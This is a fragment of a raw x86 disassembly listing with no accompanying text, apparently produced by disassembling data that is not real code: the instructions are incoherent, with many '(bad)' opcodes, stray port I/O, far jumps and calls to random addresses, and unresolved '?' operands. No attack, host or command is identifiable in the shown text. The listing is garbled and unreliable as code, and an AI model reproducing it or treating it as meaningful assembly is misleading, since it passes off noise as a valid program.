  41f5a4:	xor    BYTE PTR [ecx+0x6d],bl
  41f5a7:	inc    esp
  41f5a8:	outs   dx,BYTE PTR ds:[esi]
  41f5a9:	push   esi
  41f5aa:	pop    ebp
  41f5ab:	xor    BYTE PTR [edi-0x682d6020],0x22
  41f5b2:	fs int3 
  41f5b4:	sub    DWORD PTR [eax+0x76d248da],ebx
  41f5ba:	and    dh,BYTE PTR [ebp+0x74dbf2a5]
  41f5c0:	sub    DWORD PTR [eax],ecx
  41f5c2:	ins    BYTE PTR es:[edi],dx
  41f5c3:	arpl   sp,bx
  41f5c5:	ja     0x41f567
  41f5c7:	lods   al,BYTE PTR ds:[esi]
  41f5c8:	and    ch,bl
  41f5ca:	mov    ds:0x7525d3fb,al
  41f5cf:	stc    
  41f5d0:	jg     0x41f566
  41f5d2:	or     DWORD PTR [ecx+0x61fdd27],ebx
  41f5d8:	sahf   
  41f5d9:	add    bh,cl
  41f5db:	outs   dx,BYTE PTR ds:[esi]
  41f5dc:	shr    DWORD PTR [ecx],0xed
  41f5df:	sub    al,0x73
  41f5e1:	push   ebx
  41f5e2:	ins    BYTE PTR es:[edi],dx
  41f5e3:	stos   BYTE PTR es:[edi],al
  41f5e4:	xor    ecx,DWORD PTR [esi+0x5]
  41f5e7:	fsubr  QWORD PTR [ebp-0x53]
  41f5ea:	dec    ecx
  41f5eb:	sub    DWORD PTR ds:0xdd3a29f,0xffffffc8
  41f5f2:	mov    al,ds:0x5337cf14
  41f5f7:	in     eax,dx
  41f5f8:	mov    dl,0x2e
  41f5fa:	jo     0x41f5da
  41f5fc:	ss sbb esp,0xb2905c45
  41f603:	jo     0x41f5e8
  41f605:	outs   dx,DWORD PTR ds:[esi]
  41f606:	in     al,0x6f
  41f608:	sub    ecx,DWORD PTR [ecx-0x7ca68edf]
  41f60e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f60f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f610:	pop    ebx
  41f611:	pop    ebx
  41f612:	dec    eax
  41f613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f614:	sub    al,0xaf
  41f616:	and    bl,ch
  41f618:	bnd jmp 0x41f660
  41f61b:	sti    
  41f61c:	fldcw  WORD PTR [edi+0x76fbf4cd]
  41f622:	push   ecx
  41f623:	iret   
  41f624:	adc    al,0x11
  41f626:	inc    ebp
  41f627:	cmp    DWORD PTR [esp+ebx*2],esp
  41f62a:	jnp    0x41f687
  41f62c:	mov    ebp,?
  41f62e:	push   ecx
  41f62f:	retf   0xcf67
  41f632:	(bad)  
  41f633:	repz enter 0xf3e0,0xc9
  41f638:	repnz sbb BYTE PTR [edx-0x77bdb1d3],al
  41f63f:	cmp    DWORD PTR [esi-0x5d],0xc49386be
  41f646:	dec    edi
  41f647:	and    dh,BYTE PTR [eax+0x47246b76]
  41f64d:	push   ebp
  41f64e:	outs   dx,BYTE PTR ds:[esi]
  41f64f:	ja     0x41f5d7
  41f651:	push   esp
  41f652:	adc    bh,ch
  41f654:	push   ecx
  41f655:	pop    eax
  41f656:	jo     0x41f645
  41f658:	sub    ebx,DWORD PTR [eax]
  41f65a:	or     esi,ecx
  41f65c:	inc    eax
  41f65d:	sub    bh,ah
  41f65f:	scas   al,BYTE PTR es:[edi]
  41f660:	and    al,0x9e
  41f662:	popa   
  41f663:	mov    ds:0xd4a06e41,al
  41f668:	mov    eax,ds:0x7e6d6015
  41f66d:	pop    esi
  41f66e:	mov    ds:0xaf58323a,al
  41f673:	xor    BYTE PTR [ecx-0x4cd9ee42],bh
  41f679:	aam    0xc7
  41f67b:	les    ecx,FWORD PTR [edi+ebx*1-0xbf9a8f8]
  41f682:	stos   BYTE PTR es:[edi],al
  41f683:	ds aam 0x95
  41f686:	sub    ebx,DWORD PTR [esi]
  41f688:	pop    edi
  41f689:	in     al,dx
  41f68a:	ss stos DWORD PTR es:[edi],eax
  41f68c:	dec    ebp
  41f68d:	shl    DWORD PTR [ebp+0x10],1
  41f690:	push   ecx
  41f691:	inc    ebp
  41f692:	adc    al,0x92
  41f694:	icebp  
  41f695:	inc    edi
  41f696:	inc    ecx
  41f697:	inc    edi
  41f698:	mov    bl,0x1a
  41f69a:	imul   esi,DWORD PTR [edi-0x6],0xb06a1d1b
  41f6a1:	ret    
  41f6a2:	push   esp
  41f6a3:	arpl   bx,si
  41f6a5:	xchg   ecx,eax
  41f6a6:	popa   
  41f6a7:	push   es
  41f6a8:	int    0x43
  41f6aa:	or     BYTE PTR [esi+0x5a4ed8d2],0x32
  41f6b1:	sbb    BYTE PTR [ebp+0x739f5290],dl
  41f6b7:	sub    BYTE PTR [ecx],0x66
  41f6ba:	lods   al,BYTE PTR ds:[esi]
  41f6bb:	loope  0x41f6d3
  41f6bd:	and    DWORD PTR [ebp-0x13],0xaff77d61
  41f6c4:	cmp    esi,DWORD PTR [ebp+0x7f]
  41f6c7:	sbb    edi,DWORD PTR [ecx+edi*8+0x2a]
  41f6cb:	fdivrp st(5),st
  41f6cd:	jno    0x41f677
  41f6cf:	arpl   WORD PTR [edx-0x56],bx
  41f6d2:	jl     0x41f6dd
  41f6d4:	push   es
  41f6d5:	nop
  41f6d6:	sub    al,0x98
  41f6d8:	into   
  41f6d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6da:	mov    esp,esi
  41f6dc:	cmp    bh,BYTE PTR [edx-0x7a45f952]
  41f6e2:	in     eax,0x9f
  41f6e4:	xlat   BYTE PTR ds:[ebx]
  41f6e5:	adc    edi,DWORD PTR [edi]
  41f6e7:	adc    BYTE PTR [ebp-0x75],dl
  41f6ea:	mov    eax,ds:0xb901221e
  41f6ef:	xor    esp,DWORD PTR [edi+0x66]
  41f6f2:	test   DWORD PTR [ecx+0x418d0db2],edi
  41f6f8:	pop    edi
  41f6f9:	push   0xf3a05175
  41f6fe:	mov    ah,0x1b
  41f700:	lds    esi,FWORD PTR [ecx+ecx*8-0x49462dbc]
  41f707:	mov    edx,0x2f408f1
  41f70c:	bound  ebx,QWORD PTR [edi]
  41f70e:	sahf   
  41f70f:	clc    
  41f710:	imul   ebp,DWORD PTR [ebp+0x22],0xbbec1258
  41f717:	lods   al,BYTE PTR ds:[esi]
  41f718:	push   ebp
  41f719:	fst    DWORD PTR [ebx-0x2b16a7dd]
  41f71f:	repz inc esi
  41f721:	dec    edx
  41f722:	inc    ebx
  41f723:	dec    edx
  41f724:	in     eax,0xf4
  41f726:	(bad)  
  41f727:	push   ecx
  41f728:	fcom   DWORD PTR [edi+0x14]
  41f72b:	inc    BYTE PTR [edx+0x29]
  41f72e:	mov    ch,0xeb
  41f730:	jge    0x41f7a3
  41f732:	test   DWORD PTR [edx+0x71f1a73f],0x6e99b772
  41f73c:	sbb    BYTE PTR [ecx+ecx*2],0xa5
  41f740:	mov    ebp,0x6336af64
  41f745:	dec    edx
  41f746:	mov    ah,BYTE PTR [edi+0x42]
  41f749:	test   eax,0x657e1a9d
  41f74e:	or     esp,DWORD PTR [ebx+ebp*2]
  41f751:	in     eax,0xe2
  41f753:	(bad)  
  41f754:	sub    edi,eax
  41f756:	mov    ch,0x45
  41f758:	push   esp
  41f759:	sar    DWORD PTR [ebp-0x53d75472],cl
  41f75f:	sbb    eax,0xc8003f5c
  41f764:	xor    esp,edx
  41f766:	jbe    0x41f7a8
  41f768:	jl     0x41f769
  41f76a:	pop    es
  41f76b:	in     al,0x13
  41f76d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f76e:	out    dx,eax
  41f76f:	jl     0x41f7ad
  41f771:	stos   DWORD PTR es:[edi],eax
  41f772:	retf   
  41f773:	jb     0x41f709
  41f775:	inc    esp
  41f776:	cmp    eax,0xcd9618
  41f77b:	mov    dl,0x4d
  41f77d:	mov    edx,0x908684dd
  41f782:	dec    eax
  41f783:	(bad)  
  41f785:	mov    DWORD PTR [ecx-0x110f8961],esp
  41f78b:	sbb    BYTE PTR [esi-0x68],cl
  41f78e:	pop    ss
  41f78f:	jp     0x41f7b1
  41f791:	push   ebx
  41f792:	xor    DWORD PTR [edx+eax*4+0x3b],ecx
  41f796:	int    0x46
  41f798:	xchg   edi,eax
  41f799:	mov    cl,0x38
  41f79b:	lods   al,BYTE PTR ds:[esi]
  41f79c:	fidivr WORD PTR [edx-0x18]
  41f79f:	(bad)
  41f7a3:	push   ds
  41f7a4:	cdq    
  41f7a5:	jecxz  0x41f7e7
  41f7a7:	adc    ebp,DWORD PTR ds:0xbeeec2c3
  41f7ad:	fwait
  41f7ae:	call   0x22a82e28
  41f7b3:	and    esp,DWORD PTR [ebp-0x22d58bb1]
  41f7b9:	xor    ebx,esi
  41f7bb:	aaa    
  41f7bc:	sbb    al,0x3a
  41f7be:	pusha  
  41f7bf:	leave  
  41f7c0:	cmp    al,0xd6
  41f7c2:	push   ss
  41f7c3:	int    0xa5
  41f7c5:	ss dec ebp
  41f7c7:	cmp    al,0x94
  41f7c9:	std    
  41f7ca:	enter  0xb6a9,0xc2
  41f7ce:	cld    
  41f7cf:	push   0xffffff92
  41f7d1:	inc    edx
  41f7d2:	fbld   TBYTE PTR [eax]
  41f7d4:	push   ebp
  41f7d5:	addr16 mov dl,0xde
  41f7d8:	ins    BYTE PTR es:[edi],dx
  41f7d9:	adc    BYTE PTR [ecx+0x78],al
  41f7dc:	std    
  41f7dd:	in     eax,0x61
  41f7df:	jb     0x41f800
  41f7e1:	lods   al,BYTE PTR ds:[esi]
  41f7e2:	add    ebx,edx
  41f7e4:	(bad)  
  41f7e6:	xor    al,0xec
  41f7e8:	push   ecx
  41f7e9:	cmp    cl,BYTE PTR [esi]
  41f7eb:	dec    eax
  41f7ec:	or     DWORD PTR [edi+0x70ee219f],edi
  41f7f2:	inc    esp
  41f7f3:	js     0x41f83c
  41f7f5:	out    0x2c,eax
  41f7f7:	inc    esp
  41f7f8:	adc    BYTE PTR [ebx],bh
  41f7fa:	les    esi,FWORD PTR [bx+si-0x23e2]
  41f7ff:	xchg   ecx,eax
  41f800:	clc    
  41f801:	bound  ebp,QWORD PTR [ebp+0x20209afc]
  41f807:	sbb    eax,0x2ae34259
  41f80c:	out    0x8,al
  41f80e:	adc    DWORD PTR [ebp-0xb],ebx
  41f811:	pop    ebx
  41f812:	push   cs
  41f813:	pop    edx
  41f814:	push   0x7e5923a5
  41f819:	arpl   WORD PTR [ebx+0x67],ax
  41f81c:	mov    bl,0xa4
  41f81e:	pop    ebx
  41f81f:	pop    ds
  41f820:	std    
  41f821:	mov    dl,0xa9
  41f823:	cmp    ebx,DWORD PTR [ebp-0x54]
  41f826:	idiv   DWORD PTR [edi]
  41f828:	sbb    edi,DWORD PTR [ebx+0x6c081614]
  41f82e:	push   cs
  41f82f:	sub    DWORD PTR [edx-0x14abf0f5],ecx
  41f835:	xor    al,0xba
  41f837:	js     0x41f805
  41f839:	in     al,0x33
  41f83b:	add    ah,bh
  41f83d:	add    dl,BYTE PTR [eax-0x36]
  41f840:	adc    eax,0x1d12a419
  41f845:	loopne 0x41f8a5
  41f847:	adc    BYTE PTR ds:0x78e365e,ah
  41f84d:	mov    ds:0xe0e98d6d,al
  41f852:	add    dl,BYTE PTR [ebx+0x553b0497]
  41f858:	lahf   
  41f859:	cli    
  41f85a:	loop   0x41f888
  41f85c:	std    
  41f85d:	sub    ah,BYTE PTR [ecx-0x4f]
  41f860:	mov    ah,0x95
  41f862:	push   esi
  41f863:	sub    eax,0xbefaa68b
  41f868:	pop    esi
  41f869:	out    dx,al
  41f86a:	mov    ah,0xbf
  41f86c:	jp     0x41f8e3
  41f86e:	jae    0x41f877
  41f870:	in     eax,0xc3
  41f872:	stc    
  41f873:	inc    edi
  41f874:	mov    dl,0xf4
  41f876:	sub    BYTE PTR [edx-0x72d942b],ah
  41f87c:	add    BYTE PTR [esi],ch
  41f87e:	jmp    0x7c79:0xe866c830
  41f885:	inc    eax
  41f886:	call   0x60ed11d9
  41f88b:	lods   eax,DWORD PTR ds:[esi]
  41f88c:	scas   al,BYTE PTR es:[edi]
  41f88d:	mov    ch,al
  41f88f:	sar    edx,cl
  41f891:	push   ss
  41f892:	or     BYTE PTR [ebp+0x1e],ah
  41f895:	mov    al,0xc1
  41f897:	rcr    DWORD PTR [ecx-0x69],cl
  41f89a:	inc    ebp
  41f89b:	in     eax,dx
  41f89c:	pop    es
  41f89d:	call   0x7f838d9
  41f8a2:	lods   al,BYTE PTR ds:[esi]
  41f8a3:	stc    
  41f8a4:	pusha  
  41f8a5:	test   eax,0xaa39cc27
  41f8aa:	or     eax,0xffffffbc
  41f8ad:	mov    bh,0xce
  41f8af:	outs   dx,BYTE PTR ds:[esi]
  41f8b0:	ins    BYTE PTR es:[edi],dx
  41f8b1:	dec    ebp
  41f8b2:	jns    0x41f8cf
  41f8b4:	xor    al,0xff
  41f8b6:	and    bl,BYTE PTR [eax-0x2c]
  41f8b9:	lods   eax,DWORD PTR ds:[esi]
  41f8ba:	xchg   ebp,eax
  41f8bb:	xor    ch,al
  41f8bd:	ret    0x1226
  41f8c0:	out    0x4,al
  41f8c2:	push   esi
  41f8c3:	mov    dl,0xac
  41f8c5:	(bad)  
  41f8c7:	and    bl,ah
  41f8c9:	add    ebp,edi
  41f8cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8cc:	arpl   bx,sp
  41f8ce:	sub    BYTE PTR [ebx-0xa4853a3],al
  41f8d4:	cmp    eax,0x7de4bad3
  41f8d9:	les    ebp,FWORD PTR [ebp-0x40]
  41f8dc:	call   0x682f64d0
  41f8e1:	mov    ?,WORD PTR [eax-0x699409d8]
  41f8e7:	or     BYTE PTR [ebp+0x44],dh
  41f8ea:	loop   0x41f942
  41f8ec:	lds    esp,FWORD PTR [edi+0x76]
  41f8ef:	(bad)  
  41f8f0:	cmp    DWORD PTR [edi],edx
  41f8f2:	fcmovne st,st(7)
  41f8f4:	sub    eax,0x1b063a3a
  41f8f9:	ret    
  41f8fa:	(bad)  [ebx-0x4f]
  41f8fd:	push   ebp
  41f8fe:	jo     0x41f963
  41f900:	cmp    al,0x48
  41f902:	in     al,dx
  41f903:	neg    DWORD PTR [esi-0x4e]
  41f906:	bsf    ecx,DWORD PTR [esi-0x5b]
  41f90a:	imul   BYTE PTR [ecx+0x20]
  41f90d:	loop   0x41f8c4
  41f90f:	sub    DWORD PTR [ebx-0xf722120],eax
  41f915:	es dec ecx
  41f917:	test   DWORD PTR [edx+0x67],0x1d0980f8
  41f91e:	iret   
  41f91f:	pop    ebp
  41f920:	sbb    ecx,DWORD PTR ds:0x93b451df
  41f926:	sbb    eax,0x1795ca2b
  41f92b:	clc    
  41f92c:	adc    dh,BYTE PTR [edx+0x5c]
  41f92f:	or     eax,0x3f409a5e
  41f934:	fdiv   st(5),st
  41f936:	mov    eax,ds:0x33f124fc
  41f93b:	pop    esp
  41f93c:	popf   
  41f93d:	std    
  41f93e:	rcl    BYTE PTR [eax+0x10],1
  41f941:	sbb    eax,0xab4a6896
  41f946:	ret    
  41f947:	jae    0x41f989
  41f949:	adc    al,0x63
  41f94b:	scas   eax,DWORD PTR es:[edi]
  41f94c:	inc    esp
  41f94d:	call   0x5e3d2d3
  41f952:	and    eax,esp
  41f954:	jp     0x41f9a3
  41f956:	inc    ebp
  41f957:	dec    esp
  41f958:	into   
  41f959:	lods   eax,DWORD PTR ds:[esi]
  41f95a:	xchg   ebp,eax
  41f95b:	retf   0xfd84
  41f95e:	sbb    dl,BYTE PTR [edi]
  41f960:	jmp    0x6de99e99
  41f965:	sub    DWORD PTR [edx+edx*8+0x368e99dc],0x64107c87
  41f970:	inc    esi
  41f971:	fcomp  DWORD PTR [ebx]
  41f973:	jbe    0x41f921
  41f975:	fcom   st(0)
  41f977:	lods   eax,DWORD PTR ds:[esi]
  41f978:	popf   
  41f979:	ret    
  41f97a:	popa   
  41f97b:	pop    es
  41f97c:	fadd   QWORD PTR [ebx-0x4765af8d]
  41f982:	add    DWORD PTR [edi+0x1a],0x24bb0a65
  41f989:	xlat   BYTE PTR ds:[ebx]
  41f98a:	pop    es
  41f98b:	adc    eax,0x9b7b84a7
  41f990:	ds data16 icebp 
  41f993:	nop
  41f994:	push   ds
  41f995:	aam    0xc1
  41f997:	cli    
  41f998:	test   BYTE PTR [ebx+0x77],ch
  41f99b:	sub    bh,BYTE PTR [edi+0x21]
  41f99e:	std    
  41f99f:	pop    eax
  41f9a0:	js     0x41f964
  41f9a2:	mov    bl,0xf1
  41f9a4:	popf   
  41f9a5:	pop    edx
  41f9a6:	scas   eax,DWORD PTR es:[edi]
  41f9a7:	aam    0x92
  41f9a9:	in     eax,0x61
  41f9ab:	cmp    edx,ecx
  41f9ad:	sbb    cl,BYTE PTR [edx+eax*2+0x50]
  41f9b1:	addr16 jnp 0x41f9db
  41f9b4:	push   eax
  41f9b5:	sbb    al,0xd1
  41f9b7:	mov    dh,0x44
  41f9b9:	or     bh,BYTE PTR [ebp+0x454b5898]
  41f9bf:	adc    DWORD PTR [ebx-0x75],0x3d
  41f9c3:	loopne 0x41f958
  41f9c5:	int3   
  41f9c6:	jecxz  0x41f948
  41f9c8:	test   BYTE PTR [ecx],ch
  41f9ca:	mov    ebx,0x60ce2226
  41f9cf:	pop    edi
  41f9d0:	jnp    0x41fa42
  41f9d2:	sub    BYTE PTR ds:0x5208c56f,bh
  41f9d8:	or     al,0x90
  41f9da:	add    esp,esp
  41f9dc:	push   edi
  41f9dd:	fisubr WORD PTR [ebp+0x170d2cac]
  41f9e3:	or     al,0xb7
  41f9e5:	iret   
  41f9e6:	cmp    BYTE PTR [ecx],ch
  41f9e8:	xor    eax,0xb2d6ba7
  41f9ed:	(bad)  
  41f9ef:	ret    
  41f9f0:	in     eax,0xf4
  41f9f2:	call   0xba4b:0x8c3f1060
  41f9f9:	imul   esi,DWORD PTR [ebp-0x23fb4346],0xffffffd5
  41fa00:	hlt    
  41fa01:	aaa    
  41fa02:	in     al,0x30
  41fa04:	add    ebx,ecx
  41fa06:	fild   DWORD PTR [ebp+0x9b4f891]
  41fa0c:	inc    esp
  41fa0d:	jnp    0x41fa11
  41fa0f:	mov    WORD PTR [ebp+eiz*2-0x3eadf453],gs
  41fa16:	test   al,0xfc
  41fa18:	not    BYTE PTR [edx]
  41fa1a:	pop    ss
  41fa1b:	iret   
  41fa1c:	lods   al,BYTE PTR ds:[esi]
  41fa1d:	or     dl,cl
  41fa1f:	emms   
  41fa21:	push   ss
  41fa22:	call   0xea79ace1
  41fa27:	pop    es
  41fa28:	push   edi
  41fa29:	pop    ds
  41fa2a:	mov    edx,0x8a7c1569
  41fa2f:	int    0x75
  41fa31:	addr16 cdq 
  41fa33:	mov    ecx,0x7969b715
  41fa38:	ins    DWORD PTR es:[edi],dx
  41fa39:	push   esi
  41fa3a:	cmp    ch,BYTE PTR [ebx]
  41fa3c:	mov    bh,0x99
  41fa3e:	(bad)  
  41fa3f:	jmp    FWORD PTR [eax]
  41fa41:	and    eax,0x3f2a75dd
  41fa46:	in     al,dx
  41fa47:	(bad)  
  41fa48:	neg    dh
  41fa4a:	ret    0xbaf
  41fa4d:	sar    DWORD PTR [ebp+ecx*8+0x237cf0eb],1
  41fa54:	inc    eax
  41fa55:	push   cs
  41fa56:	sbb    ecx,DWORD PTR ds:0xf9c63c3c
  41fa5c:	adc    eax,0x93a8ee34
  41fa61:	jbe    0x41fa51
  41fa63:	add    DWORD PTR [eax+edi*8],ebx
  41fa66:	aam    0xf4
  41fa68:	or     al,0xc7
  41fa6a:	and    esp,esp
  41fa6c:	xor    ah,cl
  41fa6e:	cmp    DWORD PTR ss:[eax+edi*8-0x659691d0],esi
  41fa76:	rcl    esp,1
  41fa78:	push   ss
  41fa79:	add    ah,BYTE PTR [eax-0x11acd509]
  41fa7f:	mov    cl,0x5e
  41fa81:	sub    eax,0xfeec7d17
  41fa86:	(bad)  
  41fa88:	aad    0xd3
  41fa8a:	fldenv [edi+0x23cf1cf4]
  41fa90:	or     al,0x93
  41fa92:	pop    eax
  41fa93:	jg     0x41faf9
  41fa95:	mov    dl,0xb1
  41fa97:	enter  0xd3df,0x95
  41fa9b:	mov    bl,0x5e
  41fa9d:	mov    al,ds:0xd7866d8a
  41faa2:	lock add ch,dl
  41faa5:	stos   DWORD PTR es:[edi],eax
  41faa6:	push   ecx
  41faa7:	adc    BYTE PTR [ebp+0x55],bh
  41faaa:	shl    DWORD PTR [ecx-0x6d],cl
  41faad:	push   ds
  41faae:	lods   al,BYTE PTR ds:[esi]
  41faaf:	std    
  41fab0:	std    
  41fab1:	pop    ss
  41fab2:	xchg   ebx,eax
  41fab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab4:	outs   dx,BYTE PTR ds:[esi]
  41fab5:	pusha  
  41fab6:	mov    ecx,0xf60e40a8
  41fabb:	fstp   DWORD PTR [ecx+0x55234652]
  41fac1:	jmp    0x6562135d
  41fac6:	fild   DWORD PTR [edx+0x3b]
  41fac9:	out    dx,al
  41faca:	xchg   ebx,eax
  41facb:	scas   al,BYTE PTR es:[edi]
  41facc:	call   0xb91f:0x23b44914
  41fad3:	je     0x41faf2
  41fad5:	mov    dh,0xc4
  41fad7:	pslld  mm1,0x67
  41fadb:	sub    al,0x7a
  41fadd:	lock and DWORD PTR [esi+0x52],edx
  41fae1:	sub    al,0xdf
  41fae3:	mov    edi,0x3e0514f3
  41fae8:	mov    cl,0x42
  41faea:	gs push cs
  41faec:	inc    edi
  41faed:	xchg   esp,eax
  41faee:	(bad)  
  41faef:	sbb    al,BYTE PTR [ebx+ebx*2-0x9]
  41faf3:	xchg   ebp,eax
  41faf4:	inc    ebp
  41faf5:	scas   eax,DWORD PTR es:[edi]
  41faf6:	jmp    0x41fa90
  41faf8:	sbb    BYTE PTR ds:0xb97f7b09,ah
  41fafe:	test   eax,0xecec580
  41fb03:	repnz dec esi
  41fb05:	inc    edi
  41fb06:	jo     0x41faae
  41fb08:	push   esp
  41fb09:	adc    BYTE PTR [edi],bl
  41fb0b:	das    
  41fb0c:	adc    eax,edi
  41fb0e:	lock push 0xffffffda
  41fb11:	or     DWORD PTR [ecx+0x43],edx
  41fb14:	ret    
  41fb15:	dec    edi
  41fb16:	sbb    ch,0x14
  41fb19:	in     al,dx
  41fb1a:	ins    DWORD PTR es:[edi],dx
  41fb1b:	ja     0x41faa2
  41fb1d:	dec    esp
  41fb1e:	imul   ebx
  41fb20:	xchg   DWORD PTR [ecx+0x2f8437b2],ecx
  41fb26:	retf   0x7842
  41fb29:	loop   0x41fae0
  41fb2b:	xchg   ebx,eax
  41fb2c:	push   0xfffffff7
  41fb2e:	add    eax,0xa30d9952
  41fb33:	mov    dh,0x59
  41fb35:	mov    dl,0x6e
  41fb37:	push   cs
  41fb38:	imul   ebp,ebx,0xffffff83
  41fb3b:	ins    DWORD PTR es:[edi],dx
  41fb3c:	fwait
  41fb3d:	leave  
  41fb3e:	mov    edi,0xa052b5e8
  41fb43:	out    0x56,al
  41fb45:	push   ecx
  41fb46:	and    al,0xd8
  41fb48:	outs   dx,DWORD PTR ds:[esi]
  41fb49:	sar    DWORD PTR [ebx+esi*2],1
  41fb4c:	arpl   WORD PTR [eax+0x1e5cf1f3],ax
  41fb52:	dec    esi
  41fb53:	or     eax,0xcbd01ced
  41fb58:	sub    al,0xb5
  41fb5a:	outs   dx,BYTE PTR ds:[esi]
  41fb5b:	mov    DWORD PTR [ecx-0x5c5e281a],0x26578f90
  41fb65:	(bad)  
  41fb67:	dec    edi
  41fb68:	stc    
  41fb69:	xchg   edi,eax
  41fb6a:	outs   dx,DWORD PTR ds:[esi]
  41fb6b:	xchg   cl,cl
  41fb6d:	data16 xchg BYTE PTR [eax+0x2181c16a],ah
  41fb74:	loopne 0x41fbd2
  41fb76:	aaa    
  41fb77:	cmp    eax,0x5c7d96d9
  41fb7c:	ror    BYTE PTR [ebp-0x5f],1
  41fb7f:	dec    DWORD PTR [ebp+0x6b]
  41fb82:	(bad)  
  41fb83:	(bad)  
  41fb84:	jmp    0xdfd0:0xf3ee2a35
  41fb8b:	cmp    DWORD PTR [ebp+0x26238899],ecx
  41fb91:	jno    0x41fbeb
  41fb93:	imul   eax,DWORD PTR [edi-0x42],0x56
  41fb97:	int3   
  41fb98:	leave  
  41fb99:	mov    edx,0xfb49332
  41fb9e:	imul   esi,edx,0xc75deab3
  41fba4:	xchg   edx,eax
  41fba5:	add    al,0x20
  41fba7:	adc    edi,DWORD PTR [ebp-0x61]
  41fbaa:	stc    
  41fbab:	pop    ss
  41fbac:	rcr    BYTE PTR [esi+eax*1+0x4eae6536],cl
  41fbb3:	sbb    ah,BYTE PTR [edx]
  41fbb5:	mov    esp,edx
  41fbb7:	sub    ah,BYTE PTR [edi]
  41fbb9:	push   edx
  41fbba:	bound  eax,QWORD PTR [ebp-0x109ec624]
  41fbc0:	fdiv   DWORD PTR [ecx+eax*8+0x6d599ee5]
  41fbc7:	sub    eax,0x32f362a4
  41fbcc:	jp     0x41fc0a
  41fbce:	mov    eax,?
  41fbd0:	out    dx,eax
  41fbd1:	jmp    0x41fbb9
  41fbd3:	mov    ah,BYTE PTR fs:[ebx]
  41fbd6:	fwait
  41fbd7:	sbb    DWORD PTR [eax+0x3d33c29],0xb51e1e3a
  41fbe1:	xchg   edx,eax
  41fbe2:	jle    0x41fb95
  41fbe4:	mov    ds:0xd1f41cf4,eax
  41fbe9:	outs   dx,DWORD PTR ds:[esi]
  41fbea:	sub    ecx,eax
  41fbec:	lahf   
  41fbed:	add    bl,0x57
  41fbf0:	inc    ebp
  41fbf1:	inc    ebp
  41fbf2:	push   eax
  41fbf3:	cmp    ebx,DWORD PTR [ecx]
  41fbf5:	popa   
  41fbf6:	add    ch,BYTE PTR ds:0xfab5b3bd
  41fbfc:	pusha  
  41fbfd:	pusha  
  41fbfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc00:	data16 sbb al,0xbe
  41fc03:	push   0xee59bd53
  41fc08:	fild   QWORD PTR [edi]
  41fc0a:	push   edx
  41fc0b:	jno    0x41fc75
  41fc0d:	cmp    al,0x82
  41fc0f:	popf   
  41fc10:	jbe    0x41fba2
  41fc12:	sbb    BYTE PTR [esi],0x73
  41fc15:	in     al,dx
  41fc16:	mov    ds,WORD PTR [ebp+eiz*1+0x63]
  41fc1a:	xor    eax,0x320b5c99
  41fc1f:	pop    esi
  41fc20:	mov    dl,bl
  41fc22:	jmp    0x41fbd8
  41fc24:	pop    ebp
  41fc25:	in     al,0x2a
  41fc27:	daa    
  41fc28:	sahf   
  41fc29:	pop    eax
  41fc2a:	or     ebp,DWORD PTR [edx]
  41fc2c:	out    dx,al
  41fc2d:	lods   eax,DWORD PTR ds:[esi]
  41fc2e:	ins    BYTE PTR es:[edi],dx
  41fc2f:	aaa    
  41fc30:	jp     0x41fbff
  41fc32:	adc    eax,0xedac996b
  41fc37:	jge    0x41fc3c
  41fc39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc3a:	repz call 0xfb6c3424
  41fc40:	xor    esp,DWORD PTR [esi]
  41fc42:	sub    ah,BYTE PTR [esi+0x49]
  41fc45:	idiv   BYTE PTR [ecx-0x3a1e25e1]
  41fc4b:	fst    QWORD PTR [esi+ebp*8]
  41fc4e:	fs mov esi,0x95cb8506
  41fc54:	sbb    edx,DWORD PTR [esi-0x3f]
  41fc57:	xchg   BYTE PTR [ebp+0x20],bh
  41fc5a:	into   
  41fc5b:	push   ebx
  41fc5c:	scas   eax,DWORD PTR es:[edi]
  41fc5d:	hlt    
  41fc5e:	pop    edi
  41fc5f:	mov    ah,0xff
  41fc61:	jl     0x41fc16
  41fc63:	stc    
  41fc64:	push   eax
  41fc65:	rcr    DWORD PTR [esp+edi*4-0x1b29612],cl
  41fc6c:	aad    0xfa
  41fc6e:	add    eax,0xbf855f39
  41fc73:	sub    esp,DWORD PTR [esi]
  41fc75:	mov    ?,ebp
  41fc77:	ds bnd call 0xc26b9a53
  41fc7e:	sbb    ecx,DWORD PTR [ebx-0x19f2f7d2]
  41fc84:	xlat   BYTE PTR ds:[ebx]
  41fc85:	xor    DWORD PTR [ebx],eax
  41fc87:	test   DWORD PTR [esi-0x77],esi
  41fc8a:	icebp  
  41fc8b:	xchg   ebp,eax
  41fc8c:	mov    eax,0xb89edf50
  41fc91:	sub    al,0xe3
  41fc93:	shl    DWORD PTR [ebx],1
  41fc95:	dec    eax
  41fc96:	clc    
  41fc97:	pop    es
  41fc98:	stc    
  41fc99:	daa    
  41fc9a:	pop    ecx
  41fc9b:	mov    BYTE PTR [ebp+0x5edb1b5a],cl
  41fca1:	std    
  41fca2:	cmp    al,BYTE PTR [bx+di]
  41fca5:	push   cs
  41fca6:	mov    WORD PTR [ecx],es
  41fca8:	in     al,dx
  41fca9:	es jae 0x41fceb
  41fcac:	push   ecx
  41fcad:	test   BYTE PTR [eax],0x4b
  41fcb0:	imul   esp,DWORD PTR ss:[ebx-0x2c],0x28
  41fcb5:	outs   dx,DWORD PTR ds:[esi]
  41fcb6:	cld    
  41fcb7:	mov    bl,0x4c
  41fcb9:	stos   DWORD PTR es:[edi],eax
  41fcba:	cmp    eax,0x39d146f
  41fcbf:	lds    edi,FWORD PTR [edi]
  41fcc1:	mov    DWORD PTR [esi-0x57b7679f],edi
  41fcc7:	inc    esp
  41fcc8:	xchg   esp,eax
  41fcc9:	enter  0xe6fd,0xb
  41fccd:	stos   BYTE PTR es:[edi],al
  41fcce:	cwde   
  41fccf:	ds inc edi
  41fcd1:	out    0x9a,al
  41fcd3:	inc    ebx
  41fcd4:	fstp   DWORD PTR [edx+0x30]
